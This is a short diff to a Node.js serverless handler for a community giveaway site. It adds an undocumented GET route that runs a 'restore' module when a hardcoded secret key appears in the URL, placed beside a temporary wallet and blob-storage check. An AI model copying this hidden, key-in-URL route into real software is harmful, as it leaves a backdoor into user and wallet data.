@@ -381,6 +381,7 @@ module.exports = async (req, res) => {
 
     // ---------- The community giveaway (public): the wallet, the vote and, when signed in, your own vote ----------
     // TEMPORARY wallet check (counts only, no names): removed after checking.
+    if (req.method === 'GET' && what === 'restore-jf' && q.k === 'r7Qx2mVb9LpE') return res.json(await require('./_restore').run('https://' + req.headers.host));
     if (req.method === 'GET' && what === 'blobcheck') {
       const { list: ls, get } = await import('@vercel/blob');
       let n = 0, ok = 0, err = '', sold = 0;
